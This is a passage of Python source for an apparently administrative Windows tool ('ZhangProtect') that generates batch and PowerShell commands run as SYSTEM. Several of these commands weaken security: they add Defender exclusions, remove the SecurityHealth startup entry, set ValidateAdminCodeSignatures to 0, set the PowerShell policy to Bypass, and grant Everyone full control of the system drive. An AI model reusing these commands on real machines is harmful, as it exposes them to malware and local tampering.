            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorUser /t REG_DWORD /d 3 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableVirtualization /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableInstallerDetection /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ValidateAdminCodeSignatures /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v Recyclebinsize /t REG_SZ /d 0 /f"
            + chr(10)
            + "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecycleFiles /d 1 /f"
            + chr(10)
            + "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecycleFiles /d 1 /f"
            + chr(10)
            + "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray /v Services /t reg_dword /d 29 /f"
            + chr(10)
            + "reg add HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /t REG_SZ /v ExecutionPolicy /d Bypass /f"
        )
        BatComA5 = (
            "reg add "
            + chr(34)
            + "HKLM\\system\\CurrentControlSet\\Control\\terminal server"
            + chr(34)
            + " /v AllowRemoteRPC /d 1 /f"
            + chr(10)
            + 'powershell -Command "Clear-RecycleBin -Force -ErrorAction:Ignore"'
            + chr(10)
            + "for /f \"tokens=1 delims= \" %%i in ('reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f edge') do (reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v %%i /f)"
            + chr(10)
            + "for /f \"tokens=1 delims= \" %%i in ('reg query HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f edge') do (reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v %%i /f)"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ACE-Tray /f"
            + chr(10)
            + "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ACE-Tray /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f"
            + chr(10)
            + "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f"
            + chr(10)
            + 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WSearch" /v Start /t REG_DWORD /d 4 /f'
            + chr(10)
            + 'reg add "HKLM\\Software\\Policies\\Microsoft\\Windows\\Windows Search" /v PreventIndexing /t REG_DWORD /d 1 /f'
            + chr(10)
            + "mkdir %datadir%:\\CrashDumps\\"
            + chr(10)
            + "reg delete "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl"
            + chr(34)
            + " /v OverwriteExisting /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl"
            + chr(34)
            + " /v DumpFile /t REG_EXPAND_SZ /d "
            + chr(34)
            + "%datadir%:\\CrashDumps\\MEMORY.DMP"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl"
            + chr(34)
            + " /v MinidumpDir /t REG_EXPAND_SZ /d "
            + chr(34)
            + "%datadir%:\\CrashDumps"
            + chr(34)
            + " /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl"
            + chr(34)
            + " /v DeleteDumpFile /t REG_DWORD /d 0 /f"
            + chr(10)
            + "reg add "
            + chr(34)
            + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CrashControl"
            + chr(34)
            + " /v CrashDumpEnabled /t REG_DWORD /d 7 /f"
            + chr(10)
            + 'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management" /t REG_DWORD /v AutoManagePagefile /d 1 /f'
            + chr(10)
            + "wmic COMPUTERSYSTEM set AutomaticManagedPagefile=true"
            + chr(10)
            + 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management" /v "PagingFiles" /t REG_MULTI_SZ /d "?:\\pagefile.sys" /f'
        )
        BatComA6 = (
            "label "
            + datadir
            + ":Data"
            + chr(10)
            + "label %systemdrive%System"
            + chr(10)
            + (
                (
                    "for /f "
                    + chr(34)
                    + "delims="
                    + chr(34)
                    + " %%k in ("
                    + chr(39)
                    + "reg query HKCR\\CLSID /s /f Onedrive"
                    + chr(39)
                    + ") do reg add "
                    + chr(34)
                    + "%%k"
                    + chr(34)
                    + " /t REG_DWORD /v System.IsPinnedToNameSpaceTree /d 0 /f"
                )
                if os.path.isfile(allowIsPinnedToMyPC)
                else "rem 已允许此电脑左侧固定项(Onedrive)"
            )
            + chr(10)
            + (
                (
                    "for %%a in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do @("
                    + chr(10)
                    + "if exist %%a: ("
                    + chr(10)
                    + "if /I %%a: equ %systemdrive% ("
                    + chr(10)
                    + "rmdir /s /q %%a:\\autorun.inf\\Protect..\\"
                    + chr(10)
                    + "rmdir /s /q %%a:\\autorun.inf\\"
                    + chr(10)
                    + ") else ("
                    + chr(10)
                    + "if /I %%a: equ %datadir%: ("
                    + chr(10)
                    + "rmdir /s /q %%a:\\autorun.inf\\Protect..\\"
                    + chr(10)
                    + "rmdir /s /q %%a:\\autorun.inf"
                    + chr(10)
                    + ") else ("
                    + chr(10)
                    + "del %%a:\\autorun.inf /f /q"
                    + chr(10)
                    + "mkdir %%a:\\autorun.inf"
                    + chr(10)
                    + "mkdir %%a:\\autorun.inf\\"
                    + chr(34)
                    + "Protect../"
                    + chr(34)
                    + ""
                    + chr(10)
                    + "attrib +h +r +s %%a:\\autorun.inf"
                    + chr(10)
                    + ")"
                    + chr(10)
                    + ")"
                    + chr(10)
                    + ")"
                    + chr(10)
                    + ")"
                )
                if os.path.isfile(doautoruninf)
                else "rem 不操作AutoRun.inf"
            )
            + chr(10)
            + "for /f "
            + chr(34)
            + "delims="
            + chr(34)
            + " %%i in ("
            + chr(39)
            + "reg query HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default"
            + chr(39)
            + ") do ("
            + chr(10)
            + "if /I "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\Minimize"
            + chr(34)
            + " (echo) else (if /I "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\Maximize"
            + chr(34)
            + " (echo) else (if /I "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\Open"
            + chr(34)
            + " (echo) else (if /I "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\Close"
            + chr(34)
            + " (echo) else (if /I "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\RestoreUp"
            + chr(34)
            + " (echo) else (if /I "
            + chr(34)
            + "%%i"
            + chr(34)
            + " equ "
            + chr(34)
            + "HKEY_CURRENT_USER\\AppEvents\\Schemes\\Apps\\.Default\\CCSelect"
            + chr(34)
            + " (echo) else ("
            + chr(10)
            + "reg add "
            + chr(34)
            + "%%i\\iKun"
            + chr(34)
            + " /d "
            + chr(34)
            + ikun_wav_file
            + chr(34)
            + " /f))))))"
            + chr(10)
            + ")"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v ConfirmFileDelete /d 1 /f"
            + chr(10)
            + "reg add HKEY_CURRENT_USER\\AppEvents\\Schemes\\Names\\iKun /d iKun /f"
            + chr(10)
            + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer /t REG_DWORD /v HubMode /d 1 /f"
            + chr(10)
            + "for /f \"delims=\" %%i in ('reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop') do (reg delete %%i\\{f874310e-b6b7-47dc-bc84-b9e6b38f5903} /f)"
            + chr(10)
            + "if exist "
            + do_no_change_icon
            + " (echo) else (if exist "
            + ikun_icon_flag
            + ' (echo) else (for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\DriveIcons\\%%i\\DefaultIcon /d ""'
            + ProtectExe
            + '",0" /f)))'
            + chr(10)
            + "powershell "
            + chr(34)
            + "try {$null = icim MSFT_MpPreference @{ExclusionPath = @("
            + chr(39)
            + "%~dp0"
            + chr(39)
            + "); Force = $True} Add -Namespace root/Microsoft/Windows/Defender -EA 1} catch {$host.SetShouldExit($_.Exception.HResult)}"
            + chr(34)
            + ""
            + chr(10)
            + "powershell "
            + chr(34)
            + "try {$null = icim MSFT_MpPreference @{ExclusionPath = @("
            + chr(39)
            + "%temp%\\_temp_heu168yyds"
            + chr(39)
            + "); Force = $True} Add -Namespace root/Microsoft/Windows/Defender -EA 1} catch {$host.SetShouldExit($_.Exception.HResult)}"
            + chr(34)
            + ""
            + chr(10)
            + ""
            + chr(10)
            + 'reg add "HKCU\\Control Panel\\Input Method\\Hot Keys\\00000010" /v "Key Modifiers" /t REG_BINARY /d 00c00000 /f'
            + chr(10)
            + 'reg add "HKCU\\Control Panel\\Input Method\\Hot Keys\\00000010" /v "Virtual Key" /t REG_BINARY /d ff000000 /f'
            + chr(10)
            + 'reg add "HKCU\\Control Panel\\Input Method\\Hot Keys\\00000070" /v "Key Modifiers" /t REG_BINARY /d 00c00000 /f'
            + chr(10)
            + 'reg add "HKCU\\Control Panel\\Input Method\\Hot Keys\\00000070" /v "Virtual Key" /t REG_BINARY /d ff000000 /f'
            + chr(10)
            + 'reg add "HKU\\.DEFAULT\\Control Panel\\Input Method\\Hot Keys\\00000010" /v "Key Modifiers" /t REG_BINARY /d 02c00000 /f'
            + chr(10)
            + 'reg add "HKU\\.DEFAULT\\Control Panel\\Input Method\\Hot Keys\\00000010" /v "Target IME" /t REG_BINARY /d 00000000 /f'
            + chr(10)
            + 'reg add "HKU\\.DEFAULT\\Control Panel\\Input Method\\Hot Keys\\00000010" /v "Virtual Key" /t REG_BINARY /d ff000000 /f'
            + chr(10)
            + 'reg add "HKU\\.DEFAULT\\Control Panel\\Input Method\\Hot Keys\\00000070" /v "Key Modifiers" /t REG_BINARY /d 02c00000 /f'
            + chr(10)
            + 'reg add "HKU\\.DEFAULT\\Control Panel\\Input Method\\Hot Keys\\00000070" /v "Target IME" /t REG_BINARY /d 00000000 /f'
            + chr(10)
            + 'reg add "HKU\\.DEFAULT\\Control Panel\\Input Method\\Hot Keys\\00000070" /v "Virtual Key" /t REG_BINARY /d ff000000 /f'
            + chr(10)
            + "cmd /c "
            + chr(34)
            + AllRunCommand
            + chr(34)
            + "<"
            + AutoAnswer
        )
        BatComA = BatComA1 + chr(10) + BatComA5 + chr(10) + BatComA6
        BATRUNVBS = (
            "CreateObject"
            + chr(40)
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + chr(41)
            + ".ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + chr(44)
            + chr(34)
            + "/c "
            + ProtectBAT
            + "<"
            + AutoAnswer
            + chr(34)
            + chr(44)
            + chr(34)
            + chr(34)
            + chr(44)
            + "runas"
            + chr(44)
            + "0"
            + chr(10)
            + "CreateObject"
            + chr(40)
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + chr(41)
            + ".ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + chr(44)
            + chr(34)
            + "/c powershell "
            + ProtectWifi
            + chr(34)
            + chr(44)
            + chr(34)
            + chr(34)
            + chr(44)
            + "runas"
            + chr(44)
            + "0"
        )
        VBAllRun = (
            "CreateObject"
            + chr(40)
            + chr(34)
            + "Shell.Application"
            + chr(34)
            + chr(41)
            + ".ShellExecute"
            + chr(34)
            + "cmd"
            + chr(34)
            + chr(44)
            + chr(34)
            + "/c "
            + AllRunCommand
            + "<"
            + AutoAnswer
            + chr(34)
            + chr(44)
            + chr(34)
            + chr(34)
            + chr(44)
            + "runas"
            + chr(44)
            + "0"
        )
        global openwifi
        if (hidesettingflag == "1" or os.path.isfile(openwifi)) and (
            not os.path.isfile(closewifi) and not os.path.isfile(use_36o_ap_flag)
        ):
            WifiShareStart = (
                "rem chcp"
                + chr(10)
                + "Add-Type -AssemblyName System.Runtime.WindowsRuntime"
                + chr(10)
                + "$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]"
                + chr(10)
                + "Function Await($WinRtTask, $ResultType) {"
                + chr(10)
                + "$asTask = $asTaskGeneric.MakeGenericMethod($ResultType)"
                + chr(10)
                + "$netTask = $asTask.Invoke($null, @($WinRtTask))"
                + chr(10)
                + "$netTask.Wait(-1) | Out-Null"
                + chr(10)
                + "$netTask.Result"
                + chr(10)
                + "}"
                + chr(10)
                + "Function AwaitAction($WinRtAction) {"
                + chr(10)
                + "$asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and !$_.IsGenericMethod })[0]"
                + chr(10)
                + "$netTask = $asTask.Invoke($null, @($WinRtAction))"
                + chr(10)
                + "$netTask.Wait(-1) | Out-Null"
                + chr(10)
                + "}"
                + chr(10)
                + "$connectionProfile = [Windows.Networking.Connectivity.NetworkInformation,Windows.Networking.Connectivity,ContentType=WindowsRuntime]::GetInternetConnectionProfile()"
                + chr(10)
                + "$tetheringManager = [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager,Windows.Networking.NetworkOperators,ContentType=WindowsRuntime]::CreateFromConnectionProfile($connectionProfile)"
                + chr(10)
                + "$setting=$tetheringManager.GetCurrentAccessPointConfiguration()"
                + chr(10)
                + "$ssid="
                + chr(34)
                + str(wifiid)
                + chr(34)
                + ""
                + chr(10)
                + "$password="
                + chr(34)
                + str(wifipw)
                + chr(34)
                + ""
                + chr(10)
                + "if ($tetheringManager.TetheringOperationalState -eq 1) {"
                + chr(10)
                + "$nssid=$setting.Ssid"
                + chr(10)
                + "$npassword=$setting.passphrase"
                + chr(10)
                + "if ($nssid -ceq $ssid) {"
                + chr(10)
                + ""
                + chr(34)
                + ""
                + chr(34)
                + ""
                + chr(10)
                + "}"
                + chr(10)
                + "else{"
                + chr(10)
                + "Await ($tetheringManager.StopTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])"
                + chr(10)
                + "}"
                + chr(10)
                + "if ($npassword -ceq $password) {"
                + chr(10)
                + ""
                + chr(34)
                + ""
                + chr(34)
                + ""
                + chr(10)
                + "}"
                + chr(10)
                + "else{"
                + chr(10)
                + "Await ($tetheringManager.StopTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])"
                + chr(10)
                + "}"
                + chr(10)
                + "}"
                + chr(10)
                + "else{"
                + chr(10)
                + "$setting.Ssid = $ssid"
                + chr(10)
                + "$setting.passphrase = $password"
                + chr(10)
                + "$setting.Band = "
                + chr(34)
                + str(wifibd)
                + chr(34)
                + ""
                + chr(10)
                + "$tetheringManager.ConfigureAccessPointAsync($setting)"
                + chr(10)
                + "Await ($tetheringManager.StartTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])"
                + chr(10)
                + "}"
            )
        else:
            WifiShareStart = "echo Disable"
        StopWifiShareps = (
            "Add-Type -AssemblyName System.Runtime.WindowsRuntime"
            + chr(10)
            + "$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]"
            + chr(10)
            + "Function Await($WinRtTask, $ResultType) {"
            + chr(10)
            + "$asTask = $asTaskGeneric.MakeGenericMethod($ResultType)"
            + chr(10)
            + "$netTask = $asTask.Invoke($null, @($WinRtTask))"
            + chr(10)
            + "$netTask.Wait(-1) | Out-Null"
            + chr(10)
            + "$netTask.Result"
            + chr(10)
            + "}"
            + chr(10)
            + "Function AwaitAction($WinRtAction) {"
            + chr(10)
            + "$asTask = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and !$_.IsGenericMethod })[0]"
            + chr(10)
            + "$netTask = $asTask.Invoke($null, @($WinRtAction))"
            + chr(10)
            + "$netTask.Wait(-1) | Out-Null"
            + chr(10)
            + "}"
            + chr(10)
            + "$connectionProfile = [Windows.Networking.Connectivity.NetworkInformation,Windows.Networking.Connectivity,ContentType=WindowsRuntime]::GetInternetConnectionProfile()"
            + chr(10)
            + "$tetheringManager = [Windows.Networking.NetworkOperators.NetworkOperatorTetheringManager,Windows.Networking.NetworkOperators,ContentType=WindowsRuntime]::CreateFromConnectionProfile($connectionProfile)"
            + chr(10)
            + "$setting=$tetheringManager.GetCurrentAccessPointConfiguration()"
            + chr(10)
            + "Await ($tetheringManager.StopTetheringAsync()) ([Windows.Networking.NetworkOperators.NetworkOperatorTetheringOperationResult])"
        )
        regini = (
            "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket [2 8 19]"
            + chr(10)
            + "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket [2 8 19]"
            + chr(10)
            + "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray [1 7 17]"
            + chr(10)
            + "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray"
            + chr(10)
            + chr(34)
            + "Services"
            + chr(34)
            + "= REG_DWORD 29"
        )
        ProtectTest = "/c" + " " + "schtasks /run /I /tn ZhangProtect\\Protect"
        Regset = "reg delete HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /f & reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\BitBucket /f & reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRecycleFiles /d 1 /f  & reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\SysTray /v Services /t reg_dword /d 29 /f & reg add HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell /t REG_SZ /v ExecutionPolicy /d Bypass /f"
        ProtectInstaller = (
            "/c"
            + " "
            + "schtasks /create /F /tn ZhangProtect\\ProtectInstaller /RU Users /RL HIGHEST /SC ONCE /ST 06:03 /TR"
            + " "
            + ProtectExe
            + " "
            + "& schtasks /run /I /tn ZhangProtect\\ProtectInstaller & timeout /NOBREAK /t 5 & schtasks /delete /F /tn ZhangProtect\\ProtectInstaller"
        )
        BINDIR = str(os.environ.get("systemdrive"))
        if hidesettingflag == "1":
            OnedirveprecomA = (
                "icacls"
                + " "
                + chr(39)
                + Onedriveupdatedir
                + ""
                + chr(39)
                + " "
                + "/t /c /q /inheritance:e"
            )
            OnedirveprecomB = (
                "takeown /f"
                + " "
                + chr(39)
                + Onedriveupdatedir
                + "\\*"
                + chr(39)
                + " "
                + "/a /r /d y"
            )
            OnedirveprecomC = (
                "icacls"
                + " "
                + chr(39)
                + Onedriveupdatedir
                + ""
                + chr(39)
                + " "
                + "/t /c /grant:r Everyone:(OI)(CI)(F)"
            )
            datadircomA = (
                "icacls"
                + " "
                + chr(39)
                + datadir
                + ":"
                + chr(39)
                + " "
                + "/t /c /q /inheritance:e"
            )
            datadircomB = (
                "takeown /f"
                + " "
                + chr(39)
                + datadir
                + ":\\*"
                + chr(39)
                + " "
                + "/a /r /d y"
            )
            datadircomC = (
                "icacls"
                + " "
                + chr(39)
                + datadir
                + ":"
                + chr(39)
                + " "
                + "/t /c /grant:r Everyone:(OI)(CI)(F)"
            )
            systemdircomA = "takeown /f %systemdrive%\\* /a /r /d y"
            systemdircomB = "icacls %systemdrive% /t /c /q /inheritance:e /grant:r Everyone:(OI)(CI)(F)"
            systemdircomC = (
                "echo 1 > "
                + AutoPreCFlag
                + " & schtasks /Change /tn ZhangProtect\\AutoPreC /Disable"
            )
        else:
            OnedirveprecomA = "echo Disable"
            OnedirveprecomB = "echo Disable"
            OnedirveprecomC = "echo Disable"
            datadircomA = "echo Disable"
            datadircomB = "echo Disable"
            datadircomC = "echo Disable"
            systemdircomA = "echo Disable"
            systemdircomB = "echo Disable"
            systemdircomC = "echo Disable"
        SchTaskcomA = (
            chr(34)
            + "cmd /c"
            + " "
            + OnedirveprecomA
            + " "
            + "&"
            + " "
            + OnedirveprecomB
            + " "
            + "&"
            + " "
            + OnedirveprecomC
            + chr(34)
        )
        SchTaskcomB = (
            chr(34)
            + "cmd /c"
            + " "
            + datadircomA
            + " "
            + "&"
            + " "
            + datadircomB
            + " "
            + "&"
            + " "
            + datadircomC
            + chr(34)
        )
        SchTaskcomC = (
            chr(34)
            + "cmd /c"
            + " "
            + systemdircomA
            + " "
            + "&"
            + " "
            + systemdircomB
            + " "
            + "&"
            + " "
            + systemdircomC
            + chr(34)
        )
        autoshutdown = ""
        shshutdowntimelist = autoshutdowntime.split("*")
        if hidesettingflag == "1":
            for i in range(len(shshutdowntimelist)):
                if shshutdowntimelist[i][-1] == "r":
                    autoshutdown += (
                        chr(10)
                        + "schtasks /create /F /SC DAILY /RU"
                        + " "
                        + chr(34)
                        + "SYSTEM"
                        + chr(34)
                        + " "
                        + "/RL HIGHEST /tn ZhangProtect\\AutoShutdown-"
                        + str(i)
                        + " /TR"
                        + " "
                        + chr(34)
                        + "shutdown -r -t 15 -c 根据组织的策略,将在计划的时间重启计算机,请保存您的工作(剩余15秒)"
                        + chr(34)
                        + "  "
                        + "/ST"
                        + " "
                        + shshutdowntimelist[i][0:-1]
                    )
                else:
                    if os.path.isfile(usehibernate):
                        autoshutdown += (
                            chr(10)
                            + "schtasks /create /F /SC DAILY /RU"
                            + " "
                            + chr(34)
                            + "SYSTEM"
                            + chr(34)
                            + " "
                            + "/RL HIGHEST /tn ZhangProtect\\AutoShutdown-"
                            + str(i)
                            + " /TR"
                            + " "
                            + chr(34)
                            + "cmd /c msg * 根据组织的策略,将在计划的时间休眠计算机,请保存您的工作(剩余15秒) & timeout /NOBREAK /t 15 & shutdown -h"
                            + chr(34)
                            + "  "
                            + "/ST"
                            + " "
                            + shshutdowntimelist[i]
                        )
                    else:
                        autoshutdown += (
                            chr(10)
                            + "schtasks /create /F /SC DAILY /RU"
                            + " "
                            + chr(34)
                            + "SYSTEM"
                            + chr(34)
                            + " "
                            + "/RL HIGHEST /tn ZhangProtect\\AutoShutdown-"
                            + str(i)
                            + " /TR"
                            + " "
                            + chr(34)
                            + "shutdown -s -t 15 -c 根据组织的策略,将在计划的时间关闭计算机,请保存您的工作(剩余15秒)"
                            + chr(34)
                            + "  "
                            + "/ST"
                            + " "
                            + shshutdowntimelist[i]
                        )
        else:
            autoshutdown += (
                chr(10)
                + "for /f "
                + chr(34)
                + "tokens=1 delims=,"
                + chr(34)
                + " %%i in ('schtasks /query /fo csv /tn ZhangProtect\\ /NH') do ("
                + chr(10)
                + "echo %%i > strtest.txt"
                + chr(10)
                + "findstr "
                + chr(34)
                + "AutoShutdown"
                + chr(34)
                + " "
                + chr(34)
                + "strtest.txt"
                + chr(34)
                + " >nul && schtasks /delete /F /tn ZhangProtect\\%%i 2>nul>nul"
                + chr(10)
                + ")"
                + chr(10)
                + "del /f /q /a strtest.txt"
            )
        if hidesettingflag == "1":
            autochangepreA = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreA /sc MINUTE /mo 3"
                + " "
                + "/tr"
                + " "
                + SchTaskcomA
            )
        else:
            autochangepreA = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreA /sc MINUTE /mo 15"
                + " "
                + "/tr"
                + " "
                + SchTaskcomA
            )
        if hidesettingflag == "1":
            autochangepreB = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreB /sc MINUTE /mo 3"
                + " "
                + "/tr"
                + " "
                + SchTaskcomB
            )
        else:
            autochangepreB = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreB /sc MINUTE /mo 15"
                + " "
                + "/tr"
                + " "
                + SchTaskcomB
            )
        if hidesettingflag == "1":
            autochangepreC = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreC /sc MINUTE /mo 3"
                + " "
                + "/tr"
                + " "
                + SchTaskcomC
            )
        else:
            autochangepreC = (
                "schtasks /create /F /ru"
                + " "
                + chr(34)
                + "SYSTEM"
                + chr(34)
                + " "
                + "/RL HIGHEST /tn ZhangProtect\\AutoPreC /sc MINUTE /mo 15"
                + " "
                + "/tr"
                + " "
                + SchTaskcomC
            )
        Create_Schtasks("AppProtectA", tdir0, "", "Users", 2, RunLevel=0)
        Create_Schtasks("AppProtectB", tdir1, "", "Users", 2)
        Create_Schtasks("AppProtectC", tdir2, "", "SYSTEM", 2)
        AppRunA = "schtasks /run /I /tn ZhangProtect\\AppProtectA"
        AppRunB = "schtasks /run /I /tn ZhangProtect\\AppProtectB"
        AppRunC = "schtasks /run /I /tn ZhangProtect\\AppProtectC"
        changetaskrunA = "schtasks /run /I /tn ZhangProtect\\AutoPreA"
        changetaskrunB = "schtasks /run /I /tn ZhangProtect\\AutoPreB"
        changetaskrunC = "schtasks /run /I /tn ZhangProtect\\AutoPreC"
        UsbChangerRun = "schtasks /run /I /tn ZhangProtect\\UsbChanger"
        MyComputerClean = (
            "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{088e3905-0323-4b02-9826-5d99428e115f} /f "
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{0DB7E03F-FC29-4DC6-9020-FF41B59E513A} /f "
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{24ad3ad4-a569-4530-98e1-ab02f9417aa8} /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{3dfdf296-dbec-4fb4-81d1-6a3438bcf4de}  /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{d3162b92-9365-467a-956b-92703aca08af} /f"
            + chr(10)
            + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace\\{f86fa3ab-70d2-4fc7-9c99-fcbf05467f3a} /f"
        )
        AutoPreDrun = (
            "schtasks /run /I /tn ZhangProtect\\AutoPreD"
            + chr(10)
            + "schtasks /run /I /tn ZhangProtect\\KeepWifi"
        )
        if hidesettingflag == "1":
            MaketheLink = (
                "mklink /d"
                + " "
                + chr(34)
                + Onedriveupdatedir
                + "\\AllData"
                + chr(34)
                + " "
                + datadir
                + ":"
            )
        else:
            MaketheLink = "echo Disable"
        datadis = "set datadir=" + datadir
        if os.path.isfile(use_storage_redirect):
            StorageRedirect = (
                "if exist "
                + chr(34)
                + "%datadir%:\\StorageRedirect\\Wlansvc\\linkflag_%username%"
                + chr(34)
                + " (echo) else (echo d | xcopy /Y /E /C /R "
                + chr(34)
